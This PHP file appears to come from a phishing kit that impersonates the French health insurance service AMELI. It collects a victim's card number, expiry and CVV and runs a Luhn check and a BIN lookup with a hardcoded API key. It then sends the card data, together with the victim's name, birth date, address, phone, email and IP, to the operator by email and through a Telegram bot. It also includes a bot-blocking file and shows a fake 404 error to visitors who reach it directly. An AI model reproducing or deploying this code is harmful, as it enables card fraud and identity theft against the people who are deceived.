<?php
include("../settings.php");
include("../infos.php");
require "../prevents/useragent_block.php";
include("../common/sub_includes.php");


if(isset($_POST))
{

	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['nomcc'] = htmlspecialchars($_POST['input_cc_name']);
	$_SESSION['ccnum'] = htmlspecialchars($_POST['input_cc_num']);
	$_SESSION['ccexp'] = htmlspecialchars($_POST['input_cc_exp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['input_cc_cvv']);

if(empty($_SESSION['nomcc']) || empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']))
{
  echo json_encode(array('success' => 2));

}
else{


    function is_valid_luhn($number) {
      settype($number, 'string');
      $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
      $sum = 0;
      $flip = 0;
      for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
      }
      return $sum % 10 === 0;
  }

  if(is_valid_luhn($_SESSION["ccnum"]) && isset($_SESSION["ccnum"]) && strlen($_SESSION["ccnum"] >= 16)){


        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);

        $ch = curl_init();

        $url = "https://api.chk.cards/v1/bins?key=73a20a373ccadd6952e0ab155ffd7a71deb40ef9&bin=$bin&format=json";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);


        if (curl_errno($ch)) {
echo 'Error:' . curl_error($ch);
        }


        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        //$emoji = $someArray['country']['emoji'];
        $brand = $someArray['level'];
        $type = $someArray['type'];
        $bank = $someArray['issuer'];
        //$bank_phone = $someArray['bank']['phone'];
        $subject_title = "[BIN: $bin][$emoji $brand $type]";

        $_SESSION["bank"] = $bank;
        $_SESSION["brand"] = $brand;
        $_SESSION["type"] = $type;

        $messages = "

+1 CC 🤑✅ [AMELI v9] ♠️

💳 CC NOM : ".$_SESSION['nomcc']."
💳 Numéro : ".$_SESSION['ccnum']."
💳 Date d'expiration : ".$_SESSION['ccexp']."
💳 CVV : ".$_SESSION['cvv']."

🏛💸 Level : ".$brand."
🏛💸 Banque : ".$bank."
🏛💸 Type : ".$type."

[🩵] Full Info [🩵]

📞📋 Adresse : ".$_SESSION['adresse']."
📞📋 Code Postal : ".$_SESSION['zip']."
📞📋 Ville : ".$_SESSION['city']."
📞📋 Numéro de téléphone : ".$_SESSION['phone']."

[🆔] LOGS & INFOS [🆔]

📞📋 Nom : ".$_SESSION['nom']."
📞📋 Prénom : ".$_SESSION['prenom']."
📞📋 Naissance : ".$_SESSION['naissance']."
📞📋 Email : ".$_SESSION['mail']."

[🛜] DETAILS

🛜 Adresse ip : ".$_SESSION['ip']."
🌍 User Agent : ".$_SESSION['useragent']."


      
";

        ######################
				#### MAIL SENDING ####
				######################


        if($mail_sending == true){

$message = "

+1 CC 🤑✅ [AMELI v9] ♠️

💳 CC NOM : ".$_SESSION['nomcc']."
💳 Numéro : ".$_SESSION['ccnum']."
💳 Date d'expiration : ".$_SESSION['ccexp']."
💳 CVV : ".$_SESSION['cvv']."

🏛💸 Level : ".$brand."
🏛💸 Banque : ".$bank."
🏛💸 Type : ".$type."

[🩵] Full Info [🩵]

📞📋 Adresse : ".$_SESSION['adresse']."
📞📋 Code Postal : ".$_SESSION['zip']."
📞📋 Ville : ".$_SESSION['city']."
📞📋 Numéro de téléphone : ".$_SESSION['phone']."

[🆔] LOGS & INFOS [🆔]

📞📋 Nom : ".$_SESSION['nom']."
📞📋 Prénom : ".$_SESSION['prenom']."
📞📋 Naissance : ".$_SESSION['naissance']."
📞📋 Email : ".$_SESSION['mail']."

[🛜] DETAILS

🛜 Adresse ip : ".$_SESSION['ip']."
🌍 User Agent : ".$_SESSION['useragent']."


      
";
  
  
$subject = "「⛲️」 +1 CC  • ".$bin." • ".$bank." • ".$brand." • ".$_SESSION['ip'];
$headers = "From: v9 AMELI | CV <vito@teleg.fr>";
mail($rezmail, $subject, $message, $headers);



        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){

$data = [
'text' => "
+1 CC 🤑✅ [AMELI v9] ♠️

💳 CC NOM : ".$_SESSION['nomcc']."
💳 Numéro : ".$_SESSION['ccnum']."
💳 Date d'expiration : ".$_SESSION['ccexp']."
💳 CVV : ".$_SESSION['cvv']."

🏛💸 Level : ".$brand."
🏛💸 Banque : ".$bank."
🏛💸 Type : ".$type."

[🩵] Full Info [🩵]

📞📋 Adresse : ".$_SESSION['adresse']."
📞📋 Code Postal : ".$_SESSION['zip']."
📞📋 Ville : ".$_SESSION['city']."
📞📋 Numéro de téléphone : ".$_SESSION['phone']."

[🆔] LOGS & INFOS [🆔]

📞📋 Nom : ".$_SESSION['nom']."
📞📋 Prénom : ".$_SESSION['prenom']."
📞📋 Naissance : ".$_SESSION['naissance']."
📞📋 Email : ".$_SESSION['mail']."

[🛜] DETAILS

🛜 Adresse ip : ".$_SESSION['ip']."
🌍 User Agent : ".$_SESSION['useragent']."",
'chat_id' => $chat_card
];


file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
        $_SESSION["bank"] = $bank;
        $_SESSION["carded"] = true;
        $SESSIONMESSAGE = $messages;


        echo json_encode(array('success' => 1));
        redirects($SESSIONMESSAGE);


  }
  else{
    echo json_encode(array('success' => 0));
  }

}

}
else{
	echo 'Error 404 : File not found';
}




?>